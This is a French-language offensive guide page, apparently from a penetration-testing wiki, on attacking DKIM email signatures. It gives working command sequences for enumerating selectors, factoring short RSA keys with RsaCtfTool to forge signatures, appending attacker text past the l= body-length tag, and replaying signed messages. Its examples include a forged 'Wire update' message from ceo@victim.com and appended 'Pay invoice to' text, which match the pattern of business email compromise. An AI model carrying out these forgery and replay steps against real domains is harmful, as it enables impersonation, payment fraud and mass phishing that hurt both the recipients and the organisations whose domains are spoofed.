---
title: "DKIM : forger, étendre et rejouer les signatures DomainKeys"
order: 2
description: "Lire un en-tête DKIM-Signature et la clé publiée du sélecteur pour trouver la faille : aucune signature du tout, une clé RSA courte factorisable, un tag l= de longueur de corps qui permet l'ajout de contenu, un message signé rejouable, ou un sélecteur obsolète. Inclut l'identification par dig, l'extraction de la longueur de clé, l'ajout et le rejeu."
keywords:
  - DKIM
  - DKIM-Signature
  - selector
  - l= body length tag
  - DKIM replay
  - weak DKIM key
---

# DKIM

DKIM attache une signature cryptographique au courrier sortant afin qu'un destinataire puisse vérifier que le message a été autorisé par le domaine signataire et que les parties signées n'ont pas été altérées en transit. L'expéditeur ajoute un en-tête `DKIM-Signature:` ; le destinataire récupère la clé publique depuis le DNS et vérifie. Contrairement à SPF, DKIM est lié au contenu du message plutôt qu'à l'adresse IP de connexion, ce qui est exactement ce qui rend ses modes de défaillance utiles : une signature peut être trop faible pour être fiable, peut laisser une partie du message non signée, ou peut être soulevée intacte et réutilisée.

## Mécanisme

Le signataire ajoute un en-tête comme :

```text
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=victim.com; s=sel2024;
  h=from:to:subject:date; bh=<base64 body hash>; b=<base64 signature>
```

- `d=` est le domaine signataire, `s=` le sélecteur. Ensemble, ils localisent la clé à `s._domainkey.d` sous forme d'enregistrement TXT.
- `h=` liste exactement quels en-têtes sont signés, dans l'ordre. Tout ce qui n'est pas dans `h=` est non signé et peut être modifié ou ajouté librement.
- `bh=` est le hachage du corps (canonicalisé) ; `b=` est la signature RSA/Ed25519 sur les en-têtes signés plus `bh=`.
- Un tag optionnel `l=` donne le nombre d'octets de corps couverts par `bh=`. Le corps au-delà de ce compte n'est pas haché.

La clé publiée ressemble à `v=DKIM1; k=rsa; p=<base64 DER public key>`. Un `p=` vide signifie que la clé est révoquée.

## Identifier

Obtenez le sélecteur à partir d'un `DKIM-Signature` dans tout courrier que vous avez reçu de la cible (son tag `s=`), puis récupérez et inspectez la clé :

```bash
dig +short TXT sel2024._domainkey.victim.com
# "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQ..."
```

Si aucun sélecteur n'est connu, énumérez les plus courants :

```bash
for s in default selector1 selector2 google k1 s1 s2 dkim mail smtp mandrill mta sig1 20230601; do
  r=$(dig +short TXT ${s}._domainkey.victim.com); [ -n "$r" ] && echo "${s} => ${r}"
done
```

Lisez la longueur de la clé en enveloppant le blob `p=` comme une clé publique PEM et en interrogeant OpenSSL :

```bash
P='MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQ...'   # the p= value, concatenated if split across strings
printf -- '-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----\n' "$P" \
  | openssl rsa -pubin -text -noout | head -1
# Public-Key: (768 bit)     <- 512/768-bit RSA is factorable; 1024 is weak, 2048 is standard
```

Points de décision :

- **Pas de clé / `p=` vide** → le sélecteur est révoqué ou le domaine ne signe pas. L'absence de DKIM à passer signifie que DMARC doit s'appuyer entièrement sur l'alignement SPF ; souvent la voie la plus rapide reste une usurpation du `From:` sous un [DMARC](dmarc.md) faible.
- **Module de 512 ou 768 bits** → factorisable sur du matériel grand public. Récupérez la clé privée et vous pouvez forger des signatures qui vérifient, vous donnant un passage aligné DKIM au nom du domaine.
- **`l=` présent dans les signatures de ce domaine** → l'ajout au corps est possible (ci-dessous).
- **Sélecteur obsolète/de test se résolvant encore** → les clés de développement laissées dans le DNS sont fréquemment courtes ou leur moitié privée a fuité dans d'anciens dépôts ; il vaut la peine de vérifier des sélecteurs comme `test`, `dev`, `k1`.

## Guidé : forger une signature à partir d'une clé courte

Si le module est de 512 ou 768 bits, factorisez-le, reconstruisez la clé privée, et signez votre propre message au nom du domaine. Extrayez le module, factorisez avec un crible de corps de nombres (CADO-NFS ou msieve/yafu), puis reconstruisez la clé :

```bash
# modulus in hex from the published key
printf -- '-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----\n' "$P" \
  | openssl rsa -pubin -modulus -noout        # Modulus=... (and -text shows exponent 65537)
# factor N into p,q (CADO-NFS), then with p,q,e reconstruct d and emit a private key (RsaCtfTool automates this)
python3 RsaCtfTool.py --publickey dkim.pub --uncipher none --private  # yields private.pem on success
# sign a crafted message with the recovered key and the real selector
swaks --to target@recipient.com --from ceo@victim.com \
      --header "Subject: Wire update" --body "..." \
      --server mx.recipient.com \
      --sign-with private.pem --sign-selector sel2024 --sign-domain victim.com
```

Un destinataire vérifiant récupère la clé publique en direct, confronte votre `b=` à celle-ci, et rapporte `dkim=pass d=victim.com`, qui s'aligne alors pour DMARC.

## Guidé : ajouter au-delà du tag l=

Lorsqu'un domaine signe avec `l=`, seuls les premiers `l=` octets de corps sont hachés dans `bh=`. Capturez un message légitimement signé du domaine, conservez ses en-têtes et son `DKIM-Signature` octet pour octet, et ajoutez votre contenu après le préfixe signé. La signature vérifie toujours sur les premiers `l=` octets ; tout ce qui suit est contrôlé par l'attaquant et rendu par le client :

```bash
# raw.eml is a signed message you received; note l=NNN in its DKIM-Signature
grep -o 'l=[0-9]*' raw.eml
# keep the signed prefix intact, append new body, then resend the raw message unchanged in its signed region
printf '\n\n--- Updated instructions below ---\nPay invoice to ...\n' >> raw.eml
swaks --to target@recipient.com --server mx.recipient.com --data raw.eml
```

Les clients de messagerie qui affichent le corps complet montrent le texte ajouté comme faisant partie d'un message `dkim=pass`. La canonicalisation compte : `c=simple/simple` est intransigeant sur les espaces, la canonicalisation de corps `relaxed` tolère les changements d'espaces en fin et de repliage de ligne, ajoutez donc proprement après le dernier octet signé.

## Guidé : rejouer un message signé

DKIM signe les en-têtes et le corps mais pas le destinataire d'enveloppe ni l'adresse IP de connexion. Un unique message légitimement signé est donc valide quel que soit celui qui le transmet ensuite et à qui, jusqu'à ce que la clé tourne. Obtenez un message signé du domaine (envoyez-vous du courrier depuis un compte dessus, ou capturez-en un), puis réinjectez le message brut, DKIM-Signature compris, vers de nouveaux destinataires :

```bash
# resend the captured, signed message verbatim to a different target; d= still aligns, signature still valid
swaks --to many.targets@recipient.com --from bounce@victim.com \
      --server mx.recipient.com --data signed-original.eml
```

Le contenu est fixe (vous ne pouvez pas changer les en-têtes signés ni la région de corps signée sans casser `b=`), de sorte que le rejeu sert à profiter de la bonne réputation d'un domaine pour une distribution de masse et à passer DMARC sur un message que le domaine a réellement signé.

## Suites

Un `dkim=pass` qui s'aligne au domaine du `From:` satisfait DMARC à lui seul, de sorte qu'une signature forgée ou rejouée est fréquemment l'usurpation la plus propre contre un domaine avec `p=reject`. Confirmez le mode d'alignement sur la page [DMARC](dmarc.md), puis assemblez et envoyez via [Usurpation d'expéditeur](sender-spoofing.md).

## Outils

- [swaks](https://github.com/jetmore/swaks)
- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
- [dkimpy (dkimverify / dknewkey)](https://launchpad.net/dkimpy)

## Références

- [RFC 6376 (DomainKeys Identified Mail)](https://datatracker.ietf.org/doc/html/rfc6376)
- [RFC 6376 section 3.5 (le tag l= de longueur de corps)](https://datatracker.ietf.org/doc/html/rfc6376#section-3.5)
- [Zach Harris : clés DKIM faibles forgeables (article Wired)](https://www.wired.com/2012/10/dkim-vulnerability-widespread/)
